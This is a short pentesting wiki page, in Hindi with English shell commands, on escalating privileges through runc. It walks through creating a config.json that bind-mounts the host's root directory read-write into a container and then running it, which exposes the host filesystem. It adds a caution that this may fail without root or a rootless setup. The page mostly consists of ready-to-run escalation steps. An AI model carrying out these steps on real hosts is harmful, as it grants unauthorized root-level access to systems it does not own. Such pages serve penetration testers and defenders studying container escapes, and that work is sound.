# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basic information

यदि आप **runc** के बारे में अधिक जानना चाहते हैं तो निम्नलिखित पृष्ठ देखें:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

यदि आप पाते हैं कि `runc` होस्ट में स्थापित है, तो आप **होस्ट के रूट / फ़ोल्डर को माउंट करते हुए एक कंटेनर चला सकते हैं**।
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> यह हमेशा काम नहीं करेगा क्योंकि runc का डिफ़ॉल्ट ऑपरेशन रूट के रूप में चलाना है, इसलिए इसे एक अप्रिविलेज्ड उपयोगकर्ता के रूप में चलाना बस काम नहीं कर सकता (जब तक आपके पास एक रूटलेस कॉन्फ़िगरेशन न हो)। रूटलेस कॉन्फ़िगरेशन को डिफ़ॉल्ट बनाना आमतौर पर एक अच्छा विचार नहीं है क्योंकि रूटलेस कंटेनरों के अंदर कुछ प्रतिबंध हैं जो रूटलेस कंटेनरों के बाहर लागू नहीं होते हैं।

{{#include ../../banners/hacktricks-training.md}}
